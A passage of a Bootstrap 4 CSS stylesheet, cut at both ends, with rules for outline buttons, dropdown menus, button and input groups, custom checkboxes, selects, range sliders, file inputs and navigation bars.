transparent;}.btn-outline-secondary:not(:disabled):not(.disabled):active, .btn-outline-secondary:not(:disabled):not(.disabled).active,.show > .btn-outline-secondary.dropdown-toggle {  color: #fff;  background-color: #6c757d;  border-color: #6c757d;}.btn-outline-secondary:not(:disabled):not(.disabled):active:focus, .btn-outline-secondary:not(:disabled):not(.disabled).active:focus,.show > .btn-outline-secondary.dropdown-toggle:focus {  box-shadow: 0 0 0 0.2rem rgba(108, 117, 125, 0.5);}.btn-outline-success {  color: #28a745;  border-color: #28a745;}.btn-outline-success:hover {  color: #fff;  background-color: #28a745;  border-color: #28a745;}.btn-outline-success:focus, .btn-outline-success.focus {  box-shadow: 0 0 0 0.2rem rgba(40, 167, 69, 0.5);}.btn-outline-success.disabled, .btn-outline-success:disabled {  color: #28a745;  background-color: transparent;}.btn-outline-success:not(:disabled):not(.disabled):active, .btn-outline-success:not(:disabled):not(.disabled).active,.show > .btn-outline-success.dropdown-toggle {  color: #fff;  background-color: #28a745;  border-color: #28a745;}.btn-outline-success:not(:disabled):not(.disabled):active:focus, .btn-outline-success:not(:disabled):not(.disabled).active:focus,.show > .btn-outline-success.dropdown-toggle:focus {  box-shadow: 0 0 0 0.2rem rgba(40, 167, 69, 0.5);}.btn-outline-info {  color: #17a2b8;  border-color: #17a2b8;}.btn-outline-info:hover {  color: #fff;  background-color: #17a2b8;  border-color: #17a2b8;}.btn-outline-info:focus, .btn-outline-info.focus {  box-shadow: 0 0 0 0.2rem rgba(23, 162, 184, 0.5);}.btn-outline-info.disabled, .btn-outline-info:disabled {  color: #17a2b8;  background-color: transparent;}.btn-outline-info:not(:disabled):not(.disabled):active, .btn-outline-info:not(:disabled):not(.disabled).active,.show > .btn-outline-info.dropdown-toggle {  color: #fff;  background-color: #17a2b8;  border-color: #17a2b8;}.btn-outline-info:not(:disabled):not(.disabled):active:focus, .btn-outline-info:not(:disabled):not(.disabled).active:focus,.show > .btn-outline-info.dropdown-toggle:focus {  box-shadow: 0 0 0 0.2rem rgba(23, 162, 184, 0.5);}.btn-outline-warning {  color: #ffc107;  border-color: #ffc107;}.btn-outline-warning:hover {  color: #212529;  background-color: #ffc107;  border-color: #ffc107;}.btn-outline-warning:focus, .btn-outline-warning.focus {  box-shadow: 0 0 0 0.2rem rgba(255, 193, 7, 0.5);}.btn-outline-warning.disabled, .btn-outline-warning:disabled {  color: #ffc107;  background-color: transparent;}.btn-outline-warning:not(:disabled):not(.disabled):active, .btn-outline-warning:not(:disabled):not(.disabled).active,.show > .btn-outline-warning.dropdown-toggle {  color: #212529;  background-color: #ffc107;  border-color: #ffc107;}.btn-outline-warning:not(:disabled):not(.disabled):active:focus, .btn-outline-warning:not(:disabled):not(.disabled).active:focus,.show > .btn-outline-warning.dropdown-toggle:focus {  box-shadow: 0 0 0 0.2rem rgba(255, 193, 7, 0.5);}.btn-outline-danger {  color: #dc3545;  border-color: #dc3545;}.btn-outline-danger:hover {  color: #fff;  background-color: #dc3545;  border-color: #dc3545;}.btn-outline-danger:focus, .btn-outline-danger.focus {  box-shadow: 0 0 0 0.2rem rgba(220, 53, 69, 0.5);}.btn-outline-danger.disabled, .btn-outline-danger:disabled {  color: #dc3545;  background-color: transparent;}.btn-outline-danger:not(:disabled):not(.disabled):active, .btn-outline-danger:not(:disabled):not(.disabled).active,.show > .btn-outline-danger.dropdown-toggle {  color: #fff;  background-color: #dc3545;  border-color: #dc3545;}.btn-outline-danger:not(:disabled):not(.disabled):active:focus, .btn-outline-danger:not(:disabled):not(.disabled).active:focus,.show > .btn-outline-danger.dropdown-toggle:focus {  box-shadow: 0 0 0 0.2rem rgba(220, 53, 69, 0.5);}.btn-outline-light {  color: #f8f9fa;  border-color: #f8f9fa;}.btn-outline-light:hover {  color: #212529;  background-color: #f8f9fa;  border-color: #f8f9fa;}.btn-outline-light:focus, .btn-outline-light.focus {  box-shadow: 0 0 0 0.2rem rgba(248, 249, 250, 0.5);}.btn-outline-light.disabled, .btn-outline-light:disabled {  color: #f8f9fa;  background-color: transparent;}.btn-outline-light:not(:disabled):not(.disabled):active, .btn-outline-light:not(:disabled):not(.disabled).active,.show > .btn-outline-light.dropdown-toggle {  color: #212529;  background-color: #f8f9fa;  border-color: #f8f9fa;}.btn-outline-light:not(:disabled):not(.disabled):active:focus, .btn-outline-light:not(:disabled):not(.disabled).active:focus,.show > .btn-outline-light.dropdown-toggle:focus {  box-shadow: 0 0 0 0.2rem rgba(248, 249, 250, 0.5);}.btn-outline-dark {  color: #343a40;  border-color: #343a40;}.btn-outline-dark:hover {  color: #fff;  background-color: #343a40;  border-color: #343a40;}.btn-outline-dark:focus, .btn-outline-dark.focus {  box-shadow: 0 0 0 0.2rem rgba(52, 58, 64, 0.5);}.btn-outline-dark.disabled, .btn-outline-dark:disabled {  color: #343a40;  background-color: transparent;}.btn-outline-dark:not(:disabled):not(.disabled):active, .btn-outline-dark:not(:disabled):not(.disabled).active,.show > .btn-outline-dark.dropdown-toggle {  color: #fff;  background-color: #343a40;  border-color: #343a40;}.btn-outline-dark:not(:disabled):not(.disabled):active:focus, .btn-outline-dark:not(:disabled):not(.disabled).active:focus,.show > .btn-outline-dark.dropdown-toggle:focus {  box-shadow: 0 0 0 0.2rem rgba(52, 58, 64, 0.5);}.btn-link {  font-weight: 400;  color: #007bff;  text-decoration: none;}.btn-link:hover {  color: #0056b3;  text-decoration: underline;}.btn-link:focus, .btn-link.focus {  text-decoration: underline;  box-shadow: none;}.btn-link:disabled, .btn-link.disabled {  color: #6c757d;  pointer-events: none;}.btn-lg, .btn-group-lg > .btn {  padding: 0.5rem 1rem;  font-size: 1.25rem;  line-height: 1.5;  border-radius: 0.3rem;}.btn-sm, .btn-group-sm > .btn {  padding: 0.25rem 0.5rem;  font-size: 0.875rem;  line-height: 1.5;  border-radius: 0.2rem;}.btn-block {  display: block;  width: 100%;}.btn-block + .btn-block {  margin-top: 0.5rem;}input[type="submit"].btn-block,input[type="reset"].btn-block,input[type="button"].btn-block {  width: 100%;}.fade {  transition: opacity 0.15s linear;}@media (prefers-reduced-motion: reduce) {  .fade {    transition: none;  }}.fade:not(.show) {  opacity: 0;}.collapse:not(.show) {  display: none;}.collapsing {  position: relative;  height: 0;  overflow: hidden;  transition: height 0.35s ease;}@media (prefers-reduced-motion: reduce) {  .collapsing {    transition: none;  }}.dropup,.dropright,.dropdown,.dropleft {  position: relative;}.dropdown-toggle {  white-space: nowrap;}.dropdown-toggle::after {  display: inline-block;  margin-left: 0.255em;  vertical-align: 0.255em;  content: "";  border-top: 0.3em solid;  border-right: 0.3em solid transparent;  border-bottom: 0;  border-left: 0.3em solid transparent;}.dropdown-toggle:empty::after {  margin-left: 0;}.dropdown-menu {  position: absolute;  top: 100%;  left: 0;  z-index: 1000;  display: none;  float: left;  min-width: 10rem;  padding: 0.5rem 0;  margin: 0.125rem 0 0;  font-size: 1rem;  color: #212529;  text-align: left;  list-style: none;  background-color: #fff;  background-clip: padding-box;  border: 1px solid rgba(0, 0, 0, 0.15);  border-radius: 0.25rem;}.dropdown-menu-left {  right: auto;  left: 0;}.dropdown-menu-right {  right: 0;  left: auto;}@media (min-width: 576px) {  .dropdown-menu-sm-left {    right: auto;    left: 0;  }  .dropdown-menu-sm-right {    right: 0;    left: auto;  }}@media (min-width: 768px) {  .dropdown-menu-md-left {    right: auto;    left: 0;  }  .dropdown-menu-md-right {    right: 0;    left: auto;  }}@media (min-width: 992px) {  .dropdown-menu-lg-left {    right: auto;    left: 0;  }  .dropdown-menu-lg-right {    right: 0;    left: auto;  }}@media (min-width: 1200px) {  .dropdown-menu-xl-left {    right: auto;    left: 0;  }  .dropdown-menu-xl-right {    right: 0;    left: auto;  }}.dropup .dropdown-menu {  top: auto;  bottom: 100%;  margin-top: 0;  margin-bottom: 0.125rem;}.dropup .dropdown-toggle::after {  display: inline-block;  margin-left: 0.255em;  vertical-align: 0.255em;  content: "";  border-top: 0;  border-right: 0.3em solid transparent;  border-bottom: 0.3em solid;  border-left: 0.3em solid transparent;}.dropup .dropdown-toggle:empty::after {  margin-left: 0;}.dropright .dropdown-menu {  top: 0;  right: auto;  left: 100%;  margin-top: 0;  margin-left: 0.125rem;}.dropright .dropdown-toggle::after {  display: inline-block;  margin-left: 0.255em;  vertical-align: 0.255em;  content: "";  border-top: 0.3em solid transparent;  border-right: 0;  border-bottom: 0.3em solid transparent;  border-left: 0.3em solid;}.dropright .dropdown-toggle:empty::after {  margin-left: 0;}.dropright .dropdown-toggle::after {  vertical-align: 0;}.dropleft .dropdown-menu {  top: 0;  right: 100%;  left: auto;  margin-top: 0;  margin-right: 0.125rem;}.dropleft .dropdown-toggle::after {  display: inline-block;  margin-left: 0.255em;  vertical-align: 0.255em;  content: "";}.dropleft .dropdown-toggle::after {  display: none;}.dropleft .dropdown-toggle::before {  display: inline-block;  margin-right: 0.255em;  vertical-align: 0.255em;  content: "";  border-top: 0.3em solid transparent;  border-right: 0.3em solid;  border-bottom: 0.3em solid transparent;}.dropleft .dropdown-toggle:empty::after {  margin-left: 0;}.dropleft .dropdown-toggle::before {  vertical-align: 0;}.dropdown-menu[x-placement^="top"], .dropdown-menu[x-placement^="right"], .dropdown-menu[x-placement^="bottom"], .dropdown-menu[x-placement^="left"] {  right: auto;  bottom: auto;}.dropdown-divider {  height: 0;  margin: 0.5rem 0;  overflow: hidden;  border-top: 1px solid #e9ecef;}.dropdown-item {  display: block;  width: 100%;  padding: 0.25rem 1.5rem;  clear: both;  font-weight: 400;  color: #212529;  text-align: inherit;  white-space: nowrap;  background-color: transparent;  border: 0;}.dropdown-item:hover, .dropdown-item:focus {  color: #16181b;  text-decoration: none;  background-color: #f8f9fa;}.dropdown-item.active, .dropdown-item:active {  color: #fff;  text-decoration: none;  background-color: #007bff;}.dropdown-item.disabled, .dropdown-item:disabled {  color: #6c757d;  pointer-events: none;  background-color: transparent;}.dropdown-menu.show {  display: block;}.dropdown-header {  display: block;  padding: 0.5rem 1.5rem;  margin-bottom: 0;  font-size: 0.875rem;  color: #6c757d;  white-space: nowrap;}.dropdown-item-text {  display: block;  padding: 0.25rem 1.5rem;  color: #212529;}.btn-group,.btn-group-vertical {  position: relative;  display: -ms-inline-flexbox;  display: inline-flex;  vertical-align: middle;}.btn-group > .btn,.btn-group-vertical > .btn {  position: relative;  -ms-flex: 1 1 auto;  flex: 1 1 auto;}.btn-group > .btn:hover,.btn-group-vertical > .btn:hover {  z-index: 1;}.btn-group > .btn:focus, .btn-group > .btn:active, .btn-group > .btn.active,.btn-group-vertical > .btn:focus,.btn-group-vertical > .btn:active,.btn-group-vertical > .btn.active {  z-index: 1;}.btn-toolbar {  display: -ms-flexbox;  display: flex;  -ms-flex-wrap: wrap;  flex-wrap: wrap;  -ms-flex-pack: start;  justify-content: flex-start;}.btn-toolbar .input-group {  width: auto;}.btn-group > .btn:not(:first-child),.btn-group > .btn-group:not(:first-child) {  margin-left: -1px;}.btn-group > .btn:not(:last-child):not(.dropdown-toggle),.btn-group > .btn-group:not(:last-child) > .btn {  border-top-right-radius: 0;  border-bottom-right-radius: 0;}.btn-group > .btn:not(:first-child),.btn-group > .btn-group:not(:first-child) > .btn {  border-top-left-radius: 0;  border-bottom-left-radius: 0;}.dropdown-toggle-split {  padding-right: 0.5625rem;  padding-left: 0.5625rem;}.dropdown-toggle-split::after,.dropup .dropdown-toggle-split::after,.dropright .dropdown-toggle-split::after {  margin-left: 0;}.dropleft .dropdown-toggle-split::before {  margin-right: 0;}.btn-sm + .dropdown-toggle-split, .btn-group-sm > .btn + .dropdown-toggle-split {  padding-right: 0.375rem;  padding-left: 0.375rem;}.btn-lg + .dropdown-toggle-split, .btn-group-lg > .btn + .dropdown-toggle-split {  padding-right: 0.75rem;  padding-left: 0.75rem;}.btn-group-vertical {  -ms-flex-direction: column;  flex-direction: column;  -ms-flex-align: start;  align-items: flex-start;  -ms-flex-pack: center;  justify-content: center;}.btn-group-vertical > .btn,.btn-group-vertical > .btn-group {  width: 100%;}.btn-group-vertical > .btn:not(:first-child),.btn-group-vertical > .btn-group:not(:first-child) {  margin-top: -1px;}.btn-group-vertical > .btn:not(:last-child):not(.dropdown-toggle),.btn-group-vertical > .btn-group:not(:last-child) > .btn {  border-bottom-right-radius: 0;  border-bottom-left-radius: 0;}.btn-group-vertical > .btn:not(:first-child),.btn-group-vertical > .btn-group:not(:first-child) > .btn {  border-top-left-radius: 0;  border-top-right-radius: 0;}.btn-group-toggle > .btn,.btn-group-toggle > .btn-group > .btn {  margin-bottom: 0;}.btn-group-toggle > .btn input[type="radio"],.btn-group-toggle > .btn input[type="checkbox"],.btn-group-toggle > .btn-group > .btn input[type="radio"],.btn-group-toggle > .btn-group > .btn input[type="checkbox"] {  position: absolute;  clip: rect(0, 0, 0, 0);  pointer-events: none;}.input-group {  position: relative;  display: -ms-flexbox;  display: flex;  -ms-flex-wrap: wrap;  flex-wrap: wrap;  -ms-flex-align: stretch;  align-items: stretch;  width: 100%;}.input-group > .form-control,.input-group > .form-control-plaintext,.input-group > .custom-select,.input-group > .custom-file {  position: relative;  -ms-flex: 1 1 auto;  flex: 1 1 auto;  width: 1%;  margin-bottom: 0;}.input-group > .form-control + .form-control,.input-group > .form-control + .custom-select,.input-group > .form-control + .custom-file,.input-group > .form-control-plaintext + .form-control,.input-group > .form-control-plaintext + .custom-select,.input-group > .form-control-plaintext + .custom-file,.input-group > .custom-select + .form-control,.input-group > .custom-select + .custom-select,.input-group > .custom-select + .custom-file,.input-group > .custom-file + .form-control,.input-group > .custom-file + .custom-select,.input-group > .custom-file + .custom-file {  margin-left: -1px;}.input-group > .form-control:focus,.input-group > .custom-select:focus,.input-group > .custom-file .custom-file-input:focus ~ .custom-file-label {  z-index: 3;}.input-group > .custom-file .custom-file-input:focus {  z-index: 4;}.input-group > .form-control:not(:last-child),.input-group > .custom-select:not(:last-child) {  border-top-right-radius: 0;  border-bottom-right-radius: 0;}.input-group > .form-control:not(:first-child),.input-group > .custom-select:not(:first-child) {  border-top-left-radius: 0;  border-bottom-left-radius: 0;}.input-group > .custom-file {  display: -ms-flexbox;  display: flex;  -ms-flex-align: center;  align-items: center;}.input-group > .custom-file:not(:last-child) .custom-file-label,.input-group > .custom-file:not(:last-child) .custom-file-label::after {  border-top-right-radius: 0;  border-bottom-right-radius: 0;}.input-group > .custom-file:not(:first-child) .custom-file-label {  border-top-left-radius: 0;  border-bottom-left-radius: 0;}.input-group-prepend,.input-group-append {  display: -ms-flexbox;  display: flex;}.input-group-prepend .btn,.input-group-append .btn {  position: relative;  z-index: 2;}.input-group-prepend .btn:focus,.input-group-append .btn:focus {  z-index: 3;}.input-group-prepend .btn + .btn,.input-group-prepend .btn + .input-group-text,.input-group-prepend .input-group-text + .input-group-text,.input-group-prepend .input-group-text + .btn,.input-group-append .btn + .btn,.input-group-append .btn + .input-group-text,.input-group-append .input-group-text + .input-group-text,.input-group-append .input-group-text + .btn {  margin-left: -1px;}.input-group-prepend {  margin-right: -1px;}.input-group-append {  margin-left: -1px;}.input-group-text {  display: -ms-flexbox;  display: flex;  -ms-flex-align: center;  align-items: center;  padding: 0.375rem 0.75rem;  margin-bottom: 0;  font-size: 1rem;  font-weight: 400;  line-height: 1.5;  color: #495057;  text-align: center;  white-space: nowrap;  background-color: #e9ecef;  border: 1px solid #ced4da;  border-radius: 0.25rem;}.input-group-text input[type="radio"],.input-group-text input[type="checkbox"] {  margin-top: 0;}.input-group-lg > .form-control:not(textarea),.input-group-lg > .custom-select {  height: calc(1.5em + 1rem + 2px);}.input-group-lg > .form-control,.input-group-lg > .custom-select,.input-group-lg > .input-group-prepend > .input-group-text,.input-group-lg > .input-group-append > .input-group-text,.input-group-lg > .input-group-prepend > .btn,.input-group-lg > .input-group-append > .btn {  padding: 0.5rem 1rem;  font-size: 1.25rem;  line-height: 1.5;  border-radius: 0.3rem;}.input-group-sm > .form-control:not(textarea),.input-group-sm > .custom-select {  height: calc(1.5em + 0.5rem + 2px);}.input-group-sm > .form-control,.input-group-sm > .custom-select,.input-group-sm > .input-group-prepend > .input-group-text,.input-group-sm > .input-group-append > .input-group-text,.input-group-sm > .input-group-prepend > .btn,.input-group-sm > .input-group-append > .btn {  padding: 0.25rem 0.5rem;  font-size: 0.875rem;  line-height: 1.5;  border-radius: 0.2rem;}.input-group-lg > .custom-select,.input-group-sm > .custom-select {  padding-right: 1.75rem;}.input-group > .input-group-prepend > .btn,.input-group > .input-group-prepend > .input-group-text,.input-group > .input-group-append:not(:last-child) > .btn,.input-group > .input-group-append:not(:last-child) > .input-group-text,.input-group > .input-group-append:last-child > .btn:not(:last-child):not(.dropdown-toggle),.input-group > .input-group-append:last-child > .input-group-text:not(:last-child) {  border-top-right-radius: 0;  border-bottom-right-radius: 0;}.input-group > .input-group-append > .btn,.input-group > .input-group-append > .input-group-text,.input-group > .input-group-prepend:not(:first-child) > .btn,.input-group > .input-group-prepend:not(:first-child) > .input-group-text,.input-group > .input-group-prepend:first-child > .btn:not(:first-child),.input-group > .input-group-prepend:first-child > .input-group-text:not(:first-child) {  border-top-left-radius: 0;  border-bottom-left-radius: 0;}.custom-control {  position: relative;  display: block;  min-height: 1.5rem;  padding-left: 1.5rem;}.custom-control-inline {  display: -ms-inline-flexbox;  display: inline-flex;  margin-right: 1rem;}.custom-control-input {  position: absolute;  z-index: -1;  opacity: 0;}.custom-control-input:checked ~ .custom-control-label::before {  color: #fff;  border-color: #007bff;  background-color: #007bff;}.custom-control-input:focus ~ .custom-control-label::before {  box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25);}.custom-control-input:focus:not(:checked) ~ .custom-control-label::before {  border-color: #80bdff;}.custom-control-input:not(:disabled):active ~ .custom-control-label::before {  color: #fff;  background-color: #b3d7ff;  border-color: #b3d7ff;}.custom-control-input:disabled ~ .custom-control-label {  color: #6c757d;}.custom-control-input:disabled ~ .custom-control-label::before {  background-color: #e9ecef;}.custom-control-label {  position: relative;  margin-bottom: 0;  vertical-align: top;}.custom-control-label::before {  position: absolute;  top: 0.25rem;  left: -1.5rem;  display: block;  width: 1rem;  height: 1rem;  pointer-events: none;  content: "";  background-color: #fff;  border: #adb5bd solid 1px;}.custom-control-label::after {  position: absolute;  top: 0.25rem;  left: -1.5rem;  display: block;  width: 1rem;  height: 1rem;  content: "";  background: no-repeat 50% / 50% 50%;}.custom-checkbox .custom-control-label::before {  border-radius: 0.25rem;}.custom-checkbox .custom-control-input:checked ~ .custom-control-label::after {  background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8 8'%3e%3cpath fill='%23fff' d='M6.564.75l-3.59 3.612-1.538-1.55L0 4.26 2.974 7.25 8 2.193z'/%3e%3c/svg%3e");}.custom-checkbox .custom-control-input:indeterminate ~ .custom-control-label::before {  border-color: #007bff;  background-color: #007bff;}.custom-checkbox .custom-control-input:indeterminate ~ .custom-control-label::after {  background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 4 4'%3e%3cpath stroke='%23fff' d='M0 2h4'/%3e%3c/svg%3e");}.custom-checkbox .custom-control-input:disabled:checked ~ .custom-control-label::before {  background-color: rgba(0, 123, 255, 0.5);}.custom-checkbox .custom-control-input:disabled:indeterminate ~ .custom-control-label::before {  background-color: rgba(0, 123, 255, 0.5);}.custom-radio .custom-control-label::before {  border-radius: 50%;}.custom-radio .custom-control-input:checked ~ .custom-control-label::after {  background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='-4 -4 8 8'%3e%3ccircle r='3' fill='%23fff'/%3e%3c/svg%3e");}.custom-radio .custom-control-input:disabled:checked ~ .custom-control-label::before {  background-color: rgba(0, 123, 255, 0.5);}.custom-switch {  padding-left: 2.25rem;}.custom-switch .custom-control-label::before {  left: -2.25rem;  width: 1.75rem;  pointer-events: all;  border-radius: 0.5rem;}.custom-switch .custom-control-label::after {  top: calc(0.25rem + 2px);  left: calc(-2.25rem + 2px);  width: calc(1rem - 4px);  height: calc(1rem - 4px);  background-color: #adb5bd;  border-radius: 0.5rem;  transition: background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out, -webkit-transform 0.15s ease-in-out;  transition: transform 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;  transition: transform 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out, -webkit-transform 0.15s ease-in-out;}@media (prefers-reduced-motion: reduce) {  .custom-switch .custom-control-label::after {    transition: none;  }}.custom-switch .custom-control-input:checked ~ .custom-control-label::after {  background-color: #fff;  -webkit-transform: translateX(0.75rem);  transform: translateX(0.75rem);}.custom-switch .custom-control-input:disabled:checked ~ .custom-control-label::before {  background-color: rgba(0, 123, 255, 0.5);}.custom-select {  display: inline-block;  width: 100%;  height: calc(1.5em + 0.75rem + 2px);  padding: 0.375rem 1.75rem 0.375rem 0.75rem;  font-size: 1rem;  font-weight: 400;  line-height: 1.5;  color: #495057;  vertical-align: middle;  background: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 4 5'%3e%3cpath fill='%23343a40' d='M2 0L0 2h4zm0 5L0 3h4z'/%3e%3c/svg%3e") no-repeat right 0.75rem center/8px 10px;  background-color: #fff;  border: 1px solid #ced4da;  border-radius: 0.25rem;  -webkit-appearance: none;  -moz-appearance: none;  appearance: none;}.custom-select:focus {  border-color: #80bdff;  outline: 0;  box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25);}.custom-select:focus::-ms-value {  color: #495057;  background-color: #fff;}.custom-select[multiple], .custom-select[size]:not([size="1"]) {  height: auto;  padding-right: 0.75rem;  background-image: none;}.custom-select:disabled {  color: #6c757d;  background-color: #e9ecef;}.custom-select::-ms-expand {  display: none;}.custom-select-sm {  height: calc(1.5em + 0.5rem + 2px);  padding-top: 0.25rem;  padding-bottom: 0.25rem;  padding-left: 0.5rem;  font-size: 0.875rem;}.custom-select-lg {  height: calc(1.5em + 1rem + 2px);  padding-top: 0.5rem;  padding-bottom: 0.5rem;  padding-left: 1rem;  font-size: 1.25rem;}.custom-file {  position: relative;  display: inline-block;  width: 100%;  height: calc(1.5em + 0.75rem + 2px);  margin-bottom: 0;}.custom-file-input {  position: relative;  z-index: 2;  width: 100%;  height: calc(1.5em + 0.75rem + 2px);  margin: 0;  opacity: 0;}.custom-file-input:focus ~ .custom-file-label {  border-color: #80bdff;  box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25);}.custom-file-input:disabled ~ .custom-file-label {  background-color: #e9ecef;}.custom-file-input:lang(en) ~ .custom-file-label::after {  content: "Browse";}.custom-file-input ~ .custom-file-label[data-browse]::after {  content: attr(data-browse);}.custom-file-label {  position: absolute;  top: 0;  right: 0;  left: 0;  z-index: 1;  height: calc(1.5em + 0.75rem + 2px);  padding: 0.375rem 0.75rem;  font-weight: 400;  line-height: 1.5;  color: #495057;  background-color: #fff;  border: 1px solid #ced4da;  border-radius: 0.25rem;}.custom-file-label::after {  position: absolute;  top: 0;  right: 0;  bottom: 0;  z-index: 3;  display: block;  height: calc(1.5em + 0.75rem);  padding: 0.375rem 0.75rem;  line-height: 1.5;  color: #495057;  content: "Browse";  background-color: #e9ecef;  border-left: inherit;  border-radius: 0 0.25rem 0.25rem 0;}.custom-range {  width: 100%;  height: calc(1rem + 0.4rem);  padding: 0;  background-color: transparent;  -webkit-appearance: none;  -moz-appearance: none;  appearance: none;}.custom-range:focus {  outline: none;}.custom-range:focus::-webkit-slider-thumb {  box-shadow: 0 0 0 1px #fff, 0 0 0 0.2rem rgba(0, 123, 255, 0.25);}.custom-range:focus::-moz-range-thumb {  box-shadow: 0 0 0 1px #fff, 0 0 0 0.2rem rgba(0, 123, 255, 0.25);}.custom-range:focus::-ms-thumb {  box-shadow: 0 0 0 1px #fff, 0 0 0 0.2rem rgba(0, 123, 255, 0.25);}.custom-range::-moz-focus-outer {  border: 0;}.custom-range::-webkit-slider-thumb {  width: 1rem;  height: 1rem;  margin-top: -0.25rem;  background-color: #007bff;  border: 0;  border-radius: 1rem;  transition: background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;  -webkit-appearance: none;  appearance: none;}@media (prefers-reduced-motion: reduce) {  .custom-range::-webkit-slider-thumb {    transition: none;  }}.custom-range::-webkit-slider-thumb:active {  background-color: #b3d7ff;}.custom-range::-webkit-slider-runnable-track {  width: 100%;  height: 0.5rem;  color: transparent;  cursor: pointer;  background-color: #dee2e6;  border-color: transparent;  border-radius: 1rem;}.custom-range::-moz-range-thumb {  width: 1rem;  height: 1rem;  background-color: #007bff;  border: 0;  border-radius: 1rem;  transition: background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;  -moz-appearance: none;  appearance: none;}@media (prefers-reduced-motion: reduce) {  .custom-range::-moz-range-thumb {    transition: none;  }}.custom-range::-moz-range-thumb:active {  background-color: #b3d7ff;}.custom-range::-moz-range-track {  width: 100%;  height: 0.5rem;  color: transparent;  cursor: pointer;  background-color: #dee2e6;  border-color: transparent;  border-radius: 1rem;}.custom-range::-ms-thumb {  width: 1rem;  height: 1rem;  margin-top: 0;  margin-right: 0.2rem;  margin-left: 0.2rem;  background-color: #007bff;  border: 0;  border-radius: 1rem;  transition: background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;  appearance: none;}@media (prefers-reduced-motion: reduce) {  .custom-range::-ms-thumb {    transition: none;  }}.custom-range::-ms-thumb:active {  background-color: #b3d7ff;}.custom-range::-ms-track {  width: 100%;  height: 0.5rem;  color: transparent;  cursor: pointer;  background-color: transparent;  border-color: transparent;  border-width: 0.5rem;}.custom-range::-ms-fill-lower {  background-color: #dee2e6;  border-radius: 1rem;}.custom-range::-ms-fill-upper {  margin-right: 15px;  background-color: #dee2e6;  border-radius: 1rem;}.custom-range:disabled::-webkit-slider-thumb {  background-color: #adb5bd;}.custom-range:disabled::-webkit-slider-runnable-track {  cursor: default;}.custom-range:disabled::-moz-range-thumb {  background-color: #adb5bd;}.custom-range:disabled::-moz-range-track {  cursor: default;}.custom-range:disabled::-ms-thumb {  background-color: #adb5bd;}.custom-control-label::before,.custom-file-label,.custom-select {  transition: background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;}@media (prefers-reduced-motion: reduce) {  .custom-control-label::before,  .custom-file-label,  .custom-select {    transition: none;  }}.nav {  display: -ms-flexbox;  display: flex;  -ms-flex-wrap: wrap;  flex-wrap: wrap;  padding-left: 0;  margin-bottom: 0;  list-style: none;}.nav-link {  display: block;  padding: 0.5rem 1rem;}.nav-link:hover, .nav-link:focus {  text-decoration: none;}.nav-link.disabled {  color: #6c757d;  pointer-events: none;  cursor: default;}.nav-tabs {  border-bottom: 1px solid #dee2e6;}.nav-tabs .nav-item {  margin-bottom: -1px;}.nav-tabs .nav-link {  border: 1px solid transparent;  border-top-left-radius: 0.25rem;  border-top-right-radius: 0.25rem;}.nav-tabs .nav-link:hover, .nav-tabs .nav-link:focus {  border-color: #e9ecef #e9ecef #dee2e6;}.nav-tabs .nav-link.disabled {  color: #6c757d;  background-color: transparent;  border-color: transparent;}.nav-tabs .nav-link.active,.nav-tabs .nav-item.show .nav-link {  color: #495057;  background-color: #fff;  border-color: #dee2e6 #dee2e6 #fff;}.nav-tabs .dropdown-menu {  margin-top: -1px;  border-top-left-radius: 0;  border-top-right-radius: 0;}.nav-pills .nav-link {  border-radius: 0.25rem;}.nav-pills .nav-link.active,.nav-pills .show > .nav-link {  color: #fff;  background-color: #007bff;}.nav-fill .nav-item {  -ms-flex: 1 1 auto;  flex: 1 1 auto;  text-align: center;}.nav-justified .nav-item {  -ms-flex-preferred-size: 0;  flex-basis: 0;  -ms-flex-positive: 1;  flex-grow: 1;  text-align: center;}.tab-content > .tab-pane {  display: none;}.tab-content > .active {  display: block;}.navbar {  position: relative;  display: -ms-flexbox;  display: flex;  -ms-flex-wrap: wrap;  flex-wrap: wrap;  -ms-flex-align: center;  align-items: center;  -ms-flex-pack: justify;  justify-content: space-between;  padding: 0.5rem 1rem;}.navbar > .container,.navbar > .container-fluid {  display: -ms-flexbox;  display: flex;  -ms-flex-wrap: wrap;  flex-wrap: wrap;  -ms-flex-align: center;  align-items: center;  -ms-flex-pack: justify;  justify-content: space-between;}.navbar-brand {  display: inline-block;  padding-top: 0.3125rem;  padding-bottom: 0.3125rem;  margin-right: 1rem;  font-size: 1.25rem;  line-height: inherit;  white-space: nowrap;}.navbar-brand:hover, .navbar-brand:focus {  text-decoration: none;}.navbar-nav {  display: -ms-flexbox;  display: flex;  -ms-flex-direction: column;  flex-direction: column;  padding-left: 0;  margin-bottom: 0;  list-style: none;}.navbar-nav .nav-link {  padding-right: 0;  padding-left: 0;}.navbar-nav .dropdown-menu {  position: static;  float: none;}.navbar-text {  display: inline-block;  padding-top: 0.5rem;  padding-bottom: 0.5rem;}.navbar-collapse {  -ms-flex-preferred-size: 100%;  flex-basis: 100%;  -ms-flex-positive: 1;  flex-grow: 1;  -ms-flex-align: center;  align-items: center;}.navbar-toggler {  padding: 0.25rem 0.75rem;  font-size: 1.25rem;  line-height: 1;  background-color: transparent;  border: 1px solid transparent;  border-radius: 0.25rem;}.navbar-toggler:hover, .navbar-toggler:focus {  text-decoration: none;}.navbar-toggler-icon {  display: inline-block;  width: 1.5em;  height: 1.5em;  vertical-align: middle;  content: "";  background: no-repeat center center;  background-size: 100% 100%;}@media (max-width: 575.98px) {  .navbar-expand-sm > .container,  .navbar-expand-sm > 